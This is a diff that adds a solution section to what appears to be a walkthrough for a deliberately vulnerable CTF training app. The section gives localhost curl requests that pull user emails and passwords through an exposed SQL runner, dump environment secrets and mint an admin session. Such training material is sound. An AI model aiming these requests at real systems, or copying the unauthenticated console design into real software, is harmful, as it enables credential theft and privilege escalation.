@@ -670,3 +670,32 @@ curl -s "localhost:4060/api/score/verify?player=h4x"
 Every line is a real HTTP result. Commands: `scan · curl · login · ask · chain · werbos · hint · sink ·
 flags · progress · score · theme · fortune · cowsay`. The `werbos <path>` command demos the
 honest-abstain loop on screen (GREEN cite+verify, or ABSTAIN).
+
+---
+
+# v13 — JuicyOps, the internal console (left exposed)
+
+The ops team's internal shell, reachable from the public site (one dir over from the leaked
+JuicySec reports). No real auth. **Deterministic — nothing executes on the host** (the classic
+command-injection sink was deliberately swapped for staff-impersonation).
+
+### I1. Console exposed · `GET /internal/console`
+Reachable unauthenticated — security by obscurity only. `FLAG{lj_internal_console_exposed}`.
+
+### I2. Arbitrary SQL runner · `POST /api/internal/exec {cmd:"sql"}`
+```bash
+curl -s localhost:4060/api/internal/exec -H 'content-type: application/json' \
+  -d '{"cmd":"sql","arg":"SELECT email,password FROM users"}'   # FLAG{lj_internal_sql_console}
+```
+
+### I3. Secrets dump · `POST /api/internal/exec {cmd:"env"}`
+```bash
+curl -s localhost:4060/api/internal/exec -H 'content-type: application/json' -d '{"cmd":"env"}'   # FLAG{lj_internal_env_dump}
+```
+
+### I4. Staff impersonation · `POST /api/internal/exec {cmd:"su"}`
+Mint a session as ANY user — instant privilege escalation:
+```bash
+curl -s localhost:4060/api/internal/exec -H 'content-type: application/json' \
+  -d '{"cmd":"su","arg":"admin@leakyjuice.com"}'   # returns an admin JWT → FLAG{lj_internal_impersonation}
+```
